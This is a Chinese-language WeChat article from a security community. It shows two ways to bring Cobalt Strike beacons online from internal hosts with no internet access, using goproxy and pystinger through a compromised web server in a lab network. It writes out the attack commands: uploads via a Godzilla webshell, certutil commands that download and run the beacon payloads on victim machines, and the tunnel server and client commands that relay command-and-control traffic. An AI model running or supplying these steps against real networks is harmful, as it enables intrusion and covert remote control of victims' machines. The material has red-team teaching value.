#  两个超实用的上线Cobaltstrike技巧！

l1ch  [ 国科漏斗社区 ](javascript:void\(0\);)

**国科漏斗社区** ![]()

微信号 Goktech_Security

功能介绍 为在校学生和IT从业人员，提供一个学习信息安全知识的渠道，也为信息安全从业人员，提供一个技术交流和提升的平台

____

__

收录于话题

  
![](https://gitee.com/fuli009/images/raw/master/public/20210903173320.png)**前言**  

#####
某个时候，在实战过程中拿到shell后，突然发现目标机器ping不通外网，没有办法走网络层协议，这时候就需要搭建不出网隧道。在本篇文章中，斗哥要送你们两个Cobalt
strike上线不出网主机的实用方法。

  
![](https://gitee.com/fuli009/images/raw/master/public/20210903173320.png)
**小技巧1：**  

 **利用goproxy上线不出网主机到Cobaltstrike**

#####  0x00 项目地址：

    
    
    https://github.com/snail007/goproxy

##### 0x01 测试环境：

    
    
    攻击机（vps）：66.28.6.100
    
    受害机1（web）：10.10.19.100(映射到66.28.5.2)
    
    受害机2（Win10）：10.10.18.51

###### 网络拓扑：

![](https://gitee.com/fuli009/images/raw/master/public/20210903173322.png)

###### FW2防火墙配置如下：

![](https://gitee.com/fuli009/images/raw/master/public/20210903173323.png)

###### 保证10.10.18.51只能与10.10.19.100通信，不能与66.28.6.100通信。

##### 0x02 goproxy http代理上线CS

######
先用Godzilla把goproxy项目里面的proxy.exe上传到目标机器的可读可写目录，执行以下命令在这台出网主机开启一个4444端口的HTTP服务，供后面与受害机2通讯。

    
    
    proxy.exe http -t tcp -p "0.0.0.0:4444" --daemon

![](https://gitee.com/fuli009/images/raw/master/public/20210903173324.png)

###### Cobalt strike创建监听器，有效荷载选择Windows
Executable(S)，不然无法上线，然后利用Godzilla将该文件上传到web服务器供受害机2下载使用。

![](https://gitee.com/fuli009/images/raw/master/public/20210903173326.png)

###### 受害机2执行如下命令，下载CS的有效载荷。

    
    
    certutil -urlcache -split -f http://10.10.19.100/goproxy_http.exe C:\Users\fujszzs\Desktop\goproxy_http.exe

![](https://gitee.com/fuli009/images/raw/master/public/20210903173327.png)

###### 受害机2执行马儿成功上线。

![](https://gitee.com/fuli009/images/raw/master/public/20210903173328.png)

![](https://gitee.com/fuli009/images/raw/master/public/20210903173329.png)

  
![](https://gitee.com/fuli009/images/raw/master/public/20210903173320.png)
**小技巧2：**  

####  **利用pystinger上线不出网主机到Cobaltstrike**

#####  0x00.项目地址：

    
    
    https://github.com/FunnyWolf/pystinger

##### 0x01.测试环境

    
    
    攻击机（vps）：66.28.6.100
    
    受害机1（web）：10.10.19.50(映射到66.28.5.2)
    
    受害机2（Win10）：10.10.18.50

###### 网络拓扑：

![](https://gitee.com/fuli009/images/raw/master/public/20210903173331.png)

###### FW2防护墙配置如下：

![](https://gitee.com/fuli009/images/raw/master/public/20210903173332.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20210903173333.png)

##### 0x02.单主机上线方式

###### 已控主机为单主机，不出外网且仅允许访问目标Web的80端口。

###### 首先上传对应语言的脚本到服务器上，访问返回UTF-8表示正常。

![](https://gitee.com/fuli009/images/raw/master/public/20210903173334.png)

###### 然后继续上传stinger_server.exe到目标服务器，并执行以下命令。

    
    
    start stinger_server.exe 0.0.0.0
    
    注：作者提示不要直接运行stinger_server.exe，因为这样可能会导致TCP断连。

###### 接着把stinger_client上传到vps下并执行以下命令。

    
    
    chmod +x stinger_client
    
    ./stinger_client -w http://66.28.5.2/proxy.php -l 0.0.0.0 -p 60000

![](https://gitee.com/fuli009/images/raw/master/public/20210903173335.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20210903173336.png)

###### Cobalt
strike设置本地监听地址（127.0.0.1）和60020端口，然后选择cs_stinger的listen发送exe或者powershell都行。

![](https://gitee.com/fuli009/images/raw/master/public/20210903173337.png)

###### webshell执行Cobalt strike生成的马儿，成功上线，并且vps这边可以看到有数据在交互。

![](https://gitee.com/fuli009/images/raw/master/public/20210903173338.png)

  

![](https://gitee.com/fuli009/images/raw/master/public/20210903173339.png)

##### 0x03.多主机上线方式

###### CobaltStrike->Listeners->Add->10.10.19.50:60020

![](https://gitee.com/fuli009/images/raw/master/public/20210903173342.png)

###### 受害机2执行如下命令，下载CS的有效载荷。

    
    
    certutil -urlcache -split -f http://10.10.19.50/stingers.exe C:\Users\fujszzs\Desktop\stingers.exe

![](https://gitee.com/fuli009/images/raw/master/public/20210903173343.png)

###### 受害机1，受害机2执行马儿成功上线。

![](https://gitee.com/fuli009/images/raw/master/public/20210903173344.png)

  
![](https://gitee.com/fuli009/images/raw/master/public/20210903173320.png)
**总结：**  

######  本次列举了两个小技巧，希望能帮到大家。咱们下期见！

######  

![]()![](https://gitee.com/fuli009/images/raw/master/public/20210903173346.png)![](https://gitee.com/fuli009/images/raw/master/public/20210903173347.png)![](https://gitee.com/fuli009/images/raw/master/public/20210903173346.png)扫码关注我们更多精彩等待你发现

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

两个超实用的上线Cobaltstrike技巧！

最多200字，当前共字

__

发送中

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

